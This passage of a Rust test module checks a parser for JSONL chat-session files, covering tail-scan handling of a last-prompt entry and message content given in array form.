            "{\"type\":\"last-prompt\",\"lastPrompt\":\"the closing ask\",\"leafUuid\":\"z\",\"sessionId\":\"abc\"}\n",
        );
        assert!(jsonl.len() as u64 > TAIL_SCAN_BYTES, "fixture must exceed the tail budget");
        fs::write(&path, &jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.last_prompt.as_deref(), Some("the closing ask"));
    }

    #[test]
    fn parse_handles_content_array_form() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = r#"{"sessionId":"abc","type":"user","message":{"content":[{"type":"text","text":"array form"}]}}"#;
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.first_prompt.as_deref(), Some("array form"));
    }
}
